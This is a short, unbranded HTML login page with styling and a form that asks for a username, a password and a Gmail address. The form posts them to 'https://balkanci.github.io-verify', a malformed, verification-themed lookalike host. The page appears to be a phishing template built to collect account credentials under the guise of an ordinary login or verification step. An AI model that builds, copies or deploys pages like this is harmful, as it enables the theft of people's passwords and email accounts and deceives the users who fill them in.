<html>
<head>
  <title>Login Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #f1f1f1;
    }
    
    h2 {
      text-align: center;
      font-family: "Arial Black", sans-serif;
      color: #000;
    }
    
    .container {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      position: relative;
      border: 2px solid #ccc;
      border-radius: 5px;
      background-color: #fff;
    }
    
    label {
      display: block;
      margin-bottom: 10px;
      font-family: "Verdana", sans-serif;
    }
    
    input[type="text"],
    input[type="password"],
    input[type="email"] {
      width: 100%;
      padding: 8px;
      border-radius: 3px;
      border: 1px solid #ccc;
      font-family: "Arial", sans-serif;
    }
    
    button[type="submit"],
    button[type="button"] {
      display: block;
      width: 100%;
      padding: 10px;
      margin-top: 20px;
      background-color: #4caf50;
      color: #fff;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      font-family: "Verdana", sans-serif;
    }
    
    #successMessage {
      font-family: "Arial Black", sans-serif;
      font-size: 24px;
      margin-top: 20px;
      color: #000;
      text-align: center;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login</h2>
    <form id="loginForm" method="post" action="https://balkanci.github.io-verify">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" required>
  
      <label for="password">Password:</label>
      <input type="password" id="password" name="password" required>
  
      <label for="gmail">Gmail:</label>
      <input type="email" id="gmail" name="gmail" required>
  
      <button type="submit" id="loginButton">Log In</button>
    </form>
  </div>
</body>
</html>
